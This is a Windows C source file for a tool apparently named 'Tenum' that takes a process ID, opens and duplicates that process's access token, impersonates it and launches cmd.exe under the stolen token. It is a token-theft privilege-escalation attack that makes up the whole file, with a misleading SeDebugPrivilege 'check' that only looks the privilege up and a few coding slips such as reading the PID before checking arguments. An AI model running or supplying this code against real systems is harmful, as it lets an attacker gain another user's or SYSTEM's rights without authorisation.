#include<windows.h>
#include<stdio.h>
#include <Winbase.h>
#pragma comment(lib, "advapi32.lib")


int main (int argc, LPCSTR argv[])
{
    DWORD pid = atoi (argv[1]); 
    if (argc != 2)
    {   printf ("==============================");
        printf ("\nUsage :: Tenum.exe <PID>\n");
        printf ("==============================\n");
        return 3;
    }
// HANDLE hProcess = OpenProcess(TOKEN_QUERY,TRUE,pid);
   HANDLE hProcess = GetCurrentProcess();
   HANDLE hToken;  
   // Openeing Token of the current process 
   BOOL rProcess = OpenProcessToken(hProcess,TOKEN_ALL_ACCESS,&hToken);
    if (!rProcess)
    {
        printf("+++++++++++++++++++++++++\nUnable to get handle of Current Process!!! \n");
        return 2;
    }
    printf ("+++++++++++++++++++++++++\nGot Handle !!!\n");

    //Checking SeDebugPriv of current process 
    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME,&luid))
    {
        printf ("+++++++++++++++++++++++++\nSeDebugPrivilege is not enable.\n");
        return 4;
    }
    printf ("+++++++++++++++++++++++++\nSeDebugPrivilege is enable!!!\n");

    //opening Remote Process Token
     HANDLE rProcess2 = OpenProcess(PROCESS_QUERY_INFORMATION,TRUE,pid );
    if (!rProcess2)
    {
        printf ("+++++++++++++++++++++++++\nUnable to open process ID %d \n",pid);
        return 5;
    }
    printf ("+++++++++++++++++++++++++\nRemote Process is opened\n");

    // Opening Token of the process  to duplicate it 
    HANDLE pToken ; 
   // HANDLE AccessToken = {}; // This is to get token retrieved from OpenProcessToken
    BOOL tResult = OpenProcessToken (rProcess2, TOKEN_DUPLICATE | TOKEN_IMPERSONATE,&pToken);
    if (!tResult)
    {
        printf ("+++++++++++++++++++++++++\nUnbale to open process token!!!\n"); 
        return 6;
    }
    printf("+++++++++++++++++++++++++\nProcess Token Opened Succesfully\nPid :: %d \n",pid);

    //These are required to call DuplicateTokenEx.
    SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	HANDLE pNewToken = new HANDLE;
    // Before calling CreatePrpcessWithTokenW function we need to impersonate loggon user 
    if (!ImpersonateLoggedOnUser(pToken))
    {
        printf ("+++++++++++++++++++++++++\nUnable To Impersonate Logged On User\n");
        return 3;
    }
        printf ("+++++++++++++++++++++++++\nUser is Impersonated\n");
    if (!DuplicateTokenEx(pToken,MAXIMUM_ALLOWED, NULL,seImpersonateLevel, tokenType,&pNewToken))
        {
            printf ("+++++++++++++++++++++++++\nUnable to Duplicate Token Error:: %d\n", GetLastError());
            return 7;
        }
    printf("+++++++++++++++++++++++++\nToken Is Duplicated Successfully!!!\n");
    STARTUPINFO si = {};
    PROCESS_INFORMATION pi = {};
    BOOL pResult = CreateProcessWithTokenW(pNewToken,LOGON_NETCREDENTIALS_ONLY,L"C:\\Windows\\System32\\cmd.exe",NULL,CREATE_NEW_CONSOLE,NULL,NULL,&si,&pi);
    
    if (!pResult)
        {
            printf("+++++++++++++++++++++++++\nUnable To Launch New Process.");
            return 8;
        }
    printf ("+++++++++++++++++++++++++\nIf Only You Can See Tears In My Eyes!"); 
    
    

   CloseHandle(hProcess);
    CloseHandle (rProcess2);
    CloseHandle(pNewToken);
    CloseHandle(pToken);
   return 0;
}